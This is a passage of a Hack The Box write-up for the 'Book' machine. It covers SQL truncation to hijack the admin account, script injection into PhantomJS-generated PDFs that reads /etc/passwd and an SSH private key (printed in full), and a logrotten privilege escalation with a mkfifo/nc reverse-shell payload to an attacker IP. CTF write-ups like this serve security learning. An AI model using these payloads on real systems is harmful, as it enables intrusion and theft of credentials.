  <span class="k">if</span> <span class="p">(</span><span class="nx">x</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Please fill name field. Should not be more than 10 characters</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">y</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Please fill email field. Should not be more than 20 characters</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, <code class="language-plaintext highlighter-rouge">admin@book.htb1234567</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book7.png" alt="" /></p><p>After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, <code class="language-plaintext highlighter-rouge">admin@book.htb123456</code>, and was successful! This seems like it is vulnerable to <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html"><code class="language-plaintext highlighter-rouge">SQL Truncation Attack</code></a>.</p><p>If we try registering with the email <code class="language-plaintext highlighter-rouge">admin@book.htb%20%20%20%20%20%201</code> and logging it with it, we login as <code class="language-plaintext highlighter-rouge">admin@book.htb</code>!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book8.png" alt="" /></p><p>However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with <code class="language-plaintext highlighter-rouge">gobuster</code>!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://book.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-t</span> 12 <span class="nt">-k</span> <span class="nt">-x</span> .php
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://book.htb/
<span class="o">[</span>+] Threads:        12
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403                                                                   	                                                                     
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/04/09 12:41:45 Starting gobuster
<span class="o">===============================================================</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
/admin <span class="o">(</span>Status: 301<span class="o">)</span>
/books.php <span class="o">(</span>Status: 302<span class="o">)</span>
/collections.php <span class="o">(</span>Status: 302<span class="o">)</span>
/contact.php <span class="o">(</span>Status: 302<span class="o">)</span>
/db.php <span class="o">(</span>Status: 200<span class="o">)</span>
/docs <span class="o">(</span>Status: 301<span class="o">)</span>
/download.php <span class="o">(</span>Status: 302<span class="o">)</span>
/feedback.php <span class="o">(</span>Status: 302<span class="o">)</span>
/home.php <span class="o">(</span>Status: 302<span class="o">)</span>
/images <span class="o">(</span>Status: 301<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/logout.php <span class="o">(</span>Status: 302<span class="o">)</span>
/profile.php <span class="o">(</span>Status: 302<span class="o">)</span>
/search.php <span class="o">(</span>Status: 302<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
/settings.php <span class="o">(</span>Status: 302<span class="o">)</span>
<span class="o">===============================================================</span>
2020/04/09 12:51:57 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>Seems like <code class="language-plaintext highlighter-rouge">/admin</code> is what we are looking for.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book9.png" alt="" /></p><p>Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention.</p><p><code class="language-plaintext highlighter-rouge">http://book.htb/admin/collections.php</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book10.png" alt="" /></p><p>Clicking on the <code class="language-plaintext highlighter-rouge">PDF</code> link beside <code class="language-plaintext highlighter-rouge">User</code> will download a <code class="language-plaintext highlighter-rouge">.pdf</code> file containing a list of the usernames and emails in a table. Likewise, for the <code class="language-plaintext highlighter-rouge">PDF</code> link beside <code class="language-plaintext highlighter-rouge">Collections</code> will download a <code class="language-plaintext highlighter-rouge">.pdf</code> file containing the list of books on the website.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book11.png" alt="" /></p><p>It seems like the <code class="language-plaintext highlighter-rouge">.pdf</code> files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: <code class="language-plaintext highlighter-rouge">HTML</code> tags. Apparently, <code class="language-plaintext highlighter-rouge">HTML</code> tags are being rendered when generating the <code class="language-plaintext highlighter-rouge">pdf</code> files. This is what happens when I change my username to <code class="language-plaintext highlighter-rouge">&lt;h1&gt;I am a H1&lt;/h1&gt;</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book12.png" alt="" /></p><p>Interesting… Lets see if we can perform <code class="language-plaintext highlighter-rouge">SSRF</code> with this:</p><p>First I start a <code class="language-plaintext highlighter-rouge">nc</code> server on port 80 to receive the web request.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 80
listening on <span class="o">[</span>any] 80 ...
</pre></table></code></div></div><p>I then change my username to <code class="language-plaintext highlighter-rouge">&lt;img src ="http://10.10.XX.XX"&gt;</code> and download the <code class="language-plaintext highlighter-rouge">.pdf</code> again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the <code class="language-plaintext highlighter-rouge">PDF</code> link for <code class="language-plaintext highlighter-rouge">Collections</code>.</p><p>This time, I put <code class="language-plaintext highlighter-rouge">&lt;img src ="http://10.10.XX.XX"&gt;</code> as the Book Title, uploaded a random file and then download the <code class="language-plaintext highlighter-rouge">.pdf</code> file.</p><p>On my <code class="language-plaintext highlighter-rouge">nc</code>, I caught the raw web request:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: 10.10.XX.XX
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">SSRF</code> was successful but what caught my eye was the <code class="language-plaintext highlighter-rouge">PhantomJS</code> in the User-Agent header.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD.

Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG.

The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image.
</pre></table></code></div></div><h1 id="exploitation-1">Exploitation (1)</h1><p>From this <a href="https://coderwall.com/p/5vmo1g/use-phantomjs-to-create-pdfs-from-html">link</a>, it states that <code class="language-plaintext highlighter-rouge">PhantomJS</code> has the function to create PDFs from HTML. Cool! To exploit this, I followed this <a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">guide</a> to read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p><p>Submitting the following as my Book Title:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nx">x</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)};</span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">file:///etc/passwd</span><span class="dl">"</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span><span class="nt">&lt;/script&gt;</span> 
</pre></table></code></div></div><p>Returns this <code class="language-plaintext highlighter-rouge">pdf</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book13.png" alt="" /></p><p>Hmm…There is the <code class="language-plaintext highlighter-rouge">ssh</code> service running on the machine and there is a user called <code class="language-plaintext highlighter-rouge">reader</code> with the home directory at <code class="language-plaintext highlighter-rouge">/home/reader</code>. Lets see if we can find any private keys in <code class="language-plaintext highlighter-rouge">/home/reader/.ssh</code>, which are typically named as <code class="language-plaintext highlighter-rouge">id_rsa</code>.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nx">x</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(</span><span class="dl">'</span><span class="o">&lt;</span><span class="nx">p</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">width:100%; word-wrap: break-word;</span><span class="dl">"</span><span class="o">&gt;</span><span class="dl">'</span><span class="s1"> + this.responseText + </span><span class="dl">'</span><span class="o">&lt;</span><span class="sr">/p&gt;'</span><span class="se">)</span><span class="sr">};x.open</span><span class="se">(</span><span class="sr">"GET","file:/</span><span class="c1">//home/reader/.ssh/id_rsa");x.send();</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Notice that I had to specify width of <code class="language-plaintext highlighter-rouge">100%</code> and <code class="language-plaintext highlighter-rouge">break-word</code>. This is because the key was too long and parts of the key will be missed out if I didn’t.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book14.png" alt="" /></p><p>I then used <code class="language-plaintext highlighter-rouge">pdftotext</code> to convert the PDF to text:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>pdftotext 19868.pdf 
</pre></table></code></div></div><p>Because of the <code class="language-plaintext highlighter-rouge">break-word</code>, you will need to manually remove the newlines to fix the private key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>19868.txt
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4<span class="o">=</span> 
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</pre></table></code></div></div><h1 id="usertxt">user.txt</h1><p>Using the private key, we can <code class="language-plaintext highlighter-rouge">ssh</code> into the box.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ chmod 700 19868.txt
$ ssh -i 19868.txt reader@book.htb
reader@book:~$ cat user.txt 
51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>In the home directory was</p><p>I first uploaded <a href="https://github.com/DominicBreuker/pspy"><code class="language-plaintext highlighter-rouge">pspy</code></a> to <code class="language-plaintext highlighter-rouge">/tmp</code> so that I could monitor for processes.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>reader@book:/tmp<span class="nv">$ </span>wget http://10.10.XX.XX/pspy
<span class="nt">--2020-07-11</span> 11:40:51--  http://10.10.XX.XX/pspy
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1090528 <span class="o">(</span>1.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: ‘pspy’

pspy                                                    100%[<span class="o">===============================================================================================================================&gt;]</span>   1.04M   584KB/s    <span class="k">in </span>1.8s    

2020-07-11 11:40:54 <span class="o">(</span>584 KB/s<span class="o">)</span> - ‘pspy’ saved <span class="o">[</span>1090528/1090528]

reader@book:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x pspy <span class="o">&amp;&amp;</span> ./pspy
...
2020/07/11 11:50:22 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>48727  | /usr/sbin/logrotate <span class="nt">-f</span> /root/log.cfg 
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">logrotate</code> was being ran from time to time as <code class="language-plaintext highlighter-rouge">root</code> and its version was outdated!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>reader@book:/tmp<span class="nv">$ </span>logrotate <span class="nt">--version</span>
logrotate 3.11.0
</pre></table></code></div></div><h1 id="exploitation-2">Exploitation (2)</h1><p>According to this <a href="https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html"><code class="language-plaintext highlighter-rouge">link</code></a>, <code class="language-plaintext highlighter-rouge">logrotate</code> version <code class="language-plaintext highlighter-rouge">3.15.1</code> and below are vulnerable to an exploit called <code class="language-plaintext highlighter-rouge">logrotten</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>reader@book:/tmp<span class="nv">$ </span>wget http://10.10.XX.XX/logrotten.c
<span class="nt">--2020-07-11</span> 12:43:27--  http://10.10.14.7/logrotten.c
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5796 <span class="o">(</span>5.7K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: ‘logrotten.c’

logrotten.c                                             100%[<span class="o">===============================================================================================================================&gt;]</span>   5.66K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.006s  

2020-07-11 12:43:27 <span class="o">(</span>975 KB/s<span class="o">)</span> - ‘logrotten.c’ saved <span class="o">[</span>5796/5796]

reader@book:/tmp<span class="nv">$ </span>gcc logrotten.c 
reader@book:/tmp<span class="nv">$ </span>gcc logrotten.c <span class="nt">-o</span> logrotten
reader@book:/tmp<span class="nv">$ </span>./logrotten 
usage: logrotten <span class="o">[</span>OPTION...] &lt;logfile&gt;
  <span class="nt">-h</span>  <span class="nt">--help</span>                 Print this <span class="nb">help</span>               
  <span class="nt">-t</span>  <span class="nt">--targetdir</span> &lt;<span class="nb">dir</span><span class="o">&gt;</span>      Abosulte path to the target directory
  <span class="nt">-p</span>  <span class="nt">--payloadfile</span> &lt;file&gt;   File that contains the payload
  <span class="nt">-s</span>  <span class="nt">--sleep</span> &lt;sec&gt;          Wait before writing the payload
  <span class="nt">-d</span>  <span class="nt">--debug</span>                Print verbose debug messages  
  <span class="nt">-c</span>  <span class="nt">--compress</span>             Hijack compressed files instead of created logfiles
  <span class="nt">-o</span>  <span class="nt">--open</span>                 Use IN_OPEN instead of IN_MOVED_FROM
</pre></table></code></div></div><p>To use <code class="language-plaintext highlighter-rouge">logrotten</code>, we need to prepare a script that will act as our payload.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cat </span>payloadfile
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.XX.XX 1337 <span class="o">&gt;</span>/tmp/f
</pre></table></code></div></div><p>The above script creates a reverse shell connection back to us, so need to prepare a listener as well using <code class="language-plaintext highlighter-rouge">nc</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p>Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a <code class="language-plaintext highlighter-rouge">access.log</code> in <code class="language-plaintext highlighter-rouge">/home/reader/backups/</code>. Echoing a line into it causes it to rotate immediately!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>reader@book:~/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> 
total 8
drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 <span class="nb">.</span>
drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
<span class="nt">-rw-r--r--</span> 1 reader reader    0 Jul 11 13:42 access.log
reader@book:~/backups<span class="nv">$ </span><span class="nb">echo </span>something <span class="o">&gt;&gt;</span> access.log
reader@book:~/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> 
total 12
drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 <span class="nb">.</span>
drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
<span class="nt">-rw-r--r--</span> 1 reader reader    0 Jul 11 13:59 access.log
<span class="nt">-rw-r--r--</span> 1 reader reader   10 Jul 11 13:59 access.log.1
</pre></table></code></div></div><p>To execute <code class="language-plaintext highlighter-rouge">logrotten</code> successfully, I will need to start another <code class="language-plaintext highlighter-rouge">ssh</code> session that will echo the line into <code class="language-plaintext highlighter-rouge">access.log</code> while my current <code class="language-plaintext highlighter-rouge">ssh</code> session will execute <code class="language-plaintext highlighter-rouge">logrotten</code>.</p><p>On current <code class="language-plaintext highlighter-rouge">ssh</code> session:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>reader@book:/tmp<span class="nv">$ </span>./logrotten <span class="nt">-p</span> payloadfile /home/reader/backups/access.log
Waiting <span class="k">for </span>rotating /home/reader/backups/access.log...
</pre></table></code></div></div><p>On another <code class="language-plaintext highlighter-rouge">ssh</code> session:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>reader@book:~/backups<span class="nv">$ </span><span class="nb">echo </span>something <span class="o">&gt;&gt;</span> access.log
</pre></table></code></div></div><p>On current <code class="language-plaintext highlighter-rouge">ssh</code> session again:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p><code class="language-plaintext highlighter-rouge">logrotten</code> has successfully created a symbolic link of our payload to <code class="language-plaintext highlighter-rouge">/etc/bash_completion.d</code>, so now we just need to run <code class="language-plaintext highlighter-rouge">/bin/bash</code> to force the execution of our payload and voila, we caught the shell as root!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.176] 49512
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cat /root/root.txt</span>
84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/phantomjs/" class="post-tag no-text-decoration" >phantomjs</a> <a href="/tags/logrotten/" class="post-tag no-text-decoration" >logrotten</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Book - rizemon's blog&url=https://rizemon.github.io/posts/book-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Book - rizemon's blog&u=https://rizemon.github.io/posts/book-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Book - rizemon's blog&url=https://rizemon.github.io/posts/book-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further 